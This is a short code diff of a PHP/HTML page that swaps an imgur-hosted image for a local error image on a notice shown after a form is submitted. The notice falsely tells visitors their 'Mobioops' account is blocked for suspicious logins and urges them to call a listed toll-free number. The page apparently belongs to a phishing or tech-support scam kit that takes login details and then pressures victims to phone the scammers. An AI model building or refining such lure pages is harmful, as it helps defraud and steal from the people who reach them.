@@ -77,7 +77,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
   <!-- BLOCKED PAGE ONLY SHOWN AFTER FORM SUBMISSION -->
   <div class="box">
-    <img src="https://i.imgur.com/Sw1qK8G.png" />
+    <div style="text-align: center;">
+    <img src="assets/images/error.jpg" alt="Error Image">
+</div>
     <h3>Your Mobioops account has been blocked due to suspicious login attempts.</h3>
     <p>Please contact customer service to unlock your account.</p>
     <a class="call" href="tel:+1-877-868-1742">Toll Free: +1-877-868-1742</a>
